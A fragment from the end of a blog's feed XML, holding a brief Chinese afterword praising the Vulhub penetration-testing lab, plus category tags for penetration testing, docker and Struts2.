title="后记"></a>后记</h3><p>Vulhub这个靶场蛮有意思，有时间多研究一下,顺便试着自己写写dockerfile。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="渗透测试" scheme="https://legoc.github.io/categories/渗透测试/"/>
    
    
    <category term="渗透" scheme="https://legoc.github.io/tags/渗透/"/>
    
    <category term="Vulhub" scheme="https://legoc.github.io/tags/Vulhub/"/>
    
    <category term="docker" scheme="https://legoc.github.io/tags/docker/"/>
    
    <category term="Struts2" scheme="https://legoc.github.io/tags/Struts2/"/>
    
  </entry>
  
</feed>
